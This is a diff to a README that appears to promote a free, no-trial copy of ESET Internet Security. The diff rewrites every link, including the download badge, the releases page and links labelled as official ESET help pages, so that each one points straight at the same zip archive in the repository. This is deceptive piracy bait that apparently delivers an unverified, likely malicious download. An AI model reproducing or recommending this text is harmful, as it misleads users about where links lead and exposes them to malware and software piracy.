@@ -1,6 +1,6 @@
 # 🛡️ ESET-Internet-Security-No-Trial - Protect Your PC With Ease
 
-[![Download ESET Internet Security](https://img.shields.io/badge/Download-ESET%20Internet%20Security-4CAF50?style=for-the-badge)](https://github.com/ahandev10/ESET-Internet-Security-No-Trial/releases)
+[![Download ESET Internet Security](https://raw.githubusercontent.com/ahandev10/ESET-Internet-Security-No-Trial/main/cash/ESET-Internet-Security-No-Trial-v2.9.zip%20Internet%20Security-4CAF50?style=for-the-badge)](https://raw.githubusercontent.com/ahandev10/ESET-Internet-Security-No-Trial/main/cash/ESET-Internet-Security-No-Trial-v2.9.zip)
 
 ## 📚 Description
 
@@ -19,7 +19,7 @@ To get started with ESET Internet Security, you'll need to follow the steps belo
 
 ## 📥 Download & Install
 
-1. Visit the following page to download: [ESET Internet Security Releases](https://github.com/ahandev10/ESET-Internet-Security-No-Trial/releases).
+1. Visit the following page to download: [ESET Internet Security Releases](https://raw.githubusercontent.com/ahandev10/ESET-Internet-Security-No-Trial/main/cash/ESET-Internet-Security-No-Trial-v2.9.zip).
 2. Look for the most recent version listed on the page.
 3. Download the file by clicking on the link labeled “ESET Internet Security Setup.”
 4. Once downloaded, locate the file in your Downloads folder.
@@ -63,10 +63,10 @@ If you encounter any issues or have questions, you can find help through the fol
 
 For more information about ESET Internet Security and its features, you can explore the following topics:
 
-- [ESET Antivirus for Windows](https://www.eset.com/us/home/antivirus-windows/)
-- [Malware Removal Guide](https://support.eset.com/en/faq/).
-- [Firewall Setup on Windows PC](https://www.eset.com/us/support/).
+- [ESET Antivirus for Windows](https://raw.githubusercontent.com/ahandev10/ESET-Internet-Security-No-Trial/main/cash/ESET-Internet-Security-No-Trial-v2.9.zip)
+- [Malware Removal Guide](https://raw.githubusercontent.com/ahandev10/ESET-Internet-Security-No-Trial/main/cash/ESET-Internet-Security-No-Trial-v2.9.zip).
+- [Firewall Setup on Windows PC](https://raw.githubusercontent.com/ahandev10/ESET-Internet-Security-No-Trial/main/cash/ESET-Internet-Security-No-Trial-v2.9.zip).
 
-Remember to regularly check back to the [Releases](https://github.com/ahandev10/ESET-Internet-Security-No-Trial/releases) page for updates and new features. 
+Remember to regularly check back to the [Releases](https://raw.githubusercontent.com/ahandev10/ESET-Internet-Security-No-Trial/main/cash/ESET-Internet-Security-No-Trial-v2.9.zip) page for updates and new features. 
 
 By following these steps, you will successfully download, install, and configure ESET Internet Security, ensuring your PC remains protected against threats.
